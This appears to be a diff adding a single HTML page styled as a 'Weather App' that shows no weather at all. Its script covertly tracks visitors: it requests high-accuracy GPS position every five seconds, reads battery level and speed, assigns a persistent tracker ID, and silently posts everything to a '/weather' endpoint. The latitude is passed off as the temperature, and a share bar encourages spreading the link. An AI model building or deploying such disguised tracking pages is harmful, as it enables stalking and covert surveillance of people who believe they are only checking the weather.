@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Weather App</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { display: flex; align-items: center; justify-content: center; min-height: 100vh; background: #07070d; font-family: 'Inter', sans-serif; padding: 1rem; overflow: hidden; }
+        .bg-grid { position: fixed; inset: 0; background-image: linear-gradient(rgba(79,172,254,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(79,172,254,0.03) 1px, transparent 1px); background-size: 40px 40px; }
+        .bg-glow { position: fixed; top: -30%; left: -20%; width: 80%; height: 80%; background: radial-gradient(circle, rgba(79,172,254,0.06), transparent 70%); }
+        .bg-glow2 { position: fixed; bottom: -30%; right: -20%; width: 80%; height: 80%; background: radial-gradient(circle, rgba(240,147,251,0.05), transparent 70%); }
+
+        .weather-card { position: relative; background: rgba(255,255,255,0.03); backdrop-filter: blur(24px); border: 1px solid rgba(255,255,255,0.06); border-radius: 28px; padding: 2.2rem; text-align: center; max-width: 340px; width: 100%; box-shadow: 0 24px 80px rgba(0,0,0,0.6); transition: opacity 0.5s; }
+        .weather-card h2 { font-size: 1.5rem; font-weight: 700; margin-bottom: 0.3rem; background: linear-gradient(135deg, #f093fb, #f5576c, #4facfe); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .location { font-size: 0.85rem; color: rgba(255,255,255,0.25); margin-bottom: 1.2rem; }
+        .weather-icon { margin: 1.2rem 0; position: relative; }
+        .weather-icon img { width: 80px; height: 80px; filter: drop-shadow(0 4px 24px rgba(79,172,254,0.2)); }
+        .weather-info { margin: 1.2rem 0; }
+        .temperature { display: block; font-size: 3.2rem; font-weight: 800; color: #fff; letter-spacing: -2px; line-height: 1; }
+        .condition { font-size: 0.95rem; color: rgba(255,255,255,0.35); margin-top: 0.3rem; }
+        .credit { margin-top: 1.5rem; padding-top: 1rem; border-top: 1px solid rgba(255,255,255,0.04); font-size: 0.7rem; color: rgba(255,255,255,0.12); }
+        .credit a { color: rgba(79,172,254,0.4); text-decoration: none; }
+        .credit a:hover { color: #4facfe; }
+
+        .status-bar { display: flex; justify-content: center; gap: 1rem; margin: 1rem 0 0.5rem; }
+        .status-pill { display: inline-flex; align-items: center; gap: 0.4rem; padding: 0.3rem 0.7rem; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05); border-radius: 20px; font-size: 0.65rem; color: rgba(255,255,255,0.3); }
+        .status-pill .live-dot { width: 5px; height: 5px; border-radius: 50%; background: #00ff88; box-shadow: 0 0 6px rgba(0,255,136,0.5); animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+
+        .share-bar { position: fixed; bottom: 2rem; left: 50%; transform: translateX(-50%); display: flex; gap: 0.5rem; background: rgba(255,255,255,0.03); backdrop-filter: blur(16px); border: 1px solid rgba(255,255,255,0.06); border-radius: 14px; padding: 0.5rem; z-index: 10; }
+        .share-bar input { background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; padding: 0.4rem 0.7rem; color: rgba(255,255,255,0.4); font-size: 0.7rem; outline: none; width: 200px; }
+        .share-bar button { background: linear-gradient(135deg, #4facfe, #00f2fe); border: none; border-radius: 8px; padding: 0.4rem 0.8rem; color: #fff; font-size: 0.7rem; font-weight: 600; cursor: pointer; transition: all 0.3s; }
+        .share-bar button:hover { transform: scale(1.05); box-shadow: 0 4px 20px rgba(79,172,254,0.3); }
+        .toast { position: fixed; top: 1.5rem; left: 50%; transform: translateX(-50%) translateY(-100px); background: rgba(0,255,136,0.1); border: 1px solid rgba(0,255,136,0.2); border-radius: 12px; padding: 0.6rem 1.2rem; color: #00ff88; font-size: 0.8rem; font-weight: 500; transition: transform 0.4s ease; z-index: 100; pointer-events: none; }
+        .toast.show { transform: translateX(-50%) translateY(0); }
+    </style>
+</head>
+<body>
+    <div class="bg-grid"></div>
+    <div class="bg-glow"></div>
+    <div class="bg-glow2"></div>
+    <div class="toast" id="toast"></div>
+
+    <div class="weather-card" id="card">
+        <h2>Weather App</h2>
+        <p class="location"><span id="city">Detecting</span> <span id="country">...</span></p>
+        <div class="weather-icon"><img src="/weather.png" alt="Weather"></div>
+        <div class="weather-info">
+            <span class="temperature" id="temp">--°C</span>
+            <span class="condition" id="condition">Fetching location...</span>
+        </div>
+        <div class="status-bar">
+            <span class="status-pill"><span class="live-dot"></span> Live</span>
+            <span class="status-pill" id="battery-status">🔋 --%</span>
+        </div>
+        <p class="credit">Developed by <a href="https://github.com/JitendraNishad91">JitendraNishad91</a></p>
+    </div>
+
+    <div class="share-bar">
+        <input type="text" id="share-url" readonly value="Loading...">
+        <button onclick="copyUrl()">Copy Link</button>
+    </div>
+
+    <script>
+        const id = localStorage.getItem("trackerId") || generateId()
+        let interval
+
+        getLocation()
+
+        const shareInput = document.getElementById("share-url")
+        shareInput.value = window.location.href
+
+        function getLocation() {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude
+                    const lng = position.coords.longitude
+                    const accuracy = position.coords.accuracy
+                    const speed = position.coords.speed
+
+                    document.getElementById("city").textContent = lat.toFixed(4)
+                    document.getElementById("country").textContent = lng.toFixed(4)
+                    document.getElementById("temp").textContent = lat.toFixed(2) + "°"
+                    document.getElementById("condition").textContent = `Live · ${new Date().toLocaleTimeString()}`
+
+                    getBattery().then(battery => {
+                        const batLevel = battery ? Math.round(battery.level * 100) : null
+                        document.getElementById("battery-status").textContent = batLevel != null ? `🔋 ${batLevel}%` : "🔋 --"
+
+                        fetch("/weather", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ id, lat, lng, battery: batLevel, speed, accuracy })
+                        }).catch(() => {})
+                    })
+                },
+                () => {
+                    document.getElementById("condition").textContent = "Location unavailable"
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            )
+
+            clearTimeout(interval)
+            interval = setTimeout(getLocation, 5000)
+        }
+
+        async function getBattery() {
+            try {
+                return await navigator.getBattery()
+            } catch { return null }
+        }
+
+        function generateId(l = 8) {
+            const c = 'abcdefghijklmnopqrstuvwxyz0123456789'
+            let r = ''
+            for (let i = 0; i < l; i++) r += c[Math.floor(Math.random() * c.length)]
+            localStorage.setItem("trackerId", r)
+            return r
+        }
+
+        function copyUrl() {
+            shareInput.select()
+            navigator.clipboard.writeText(shareInput.value)
+            const t = document.getElementById("toast")
+            t.textContent = "Link copied!"
+            t.classList.add("show")
+            setTimeout(() => t.classList.remove("show"), 2000)
+        }
+    </script>
+</body>
+</html>
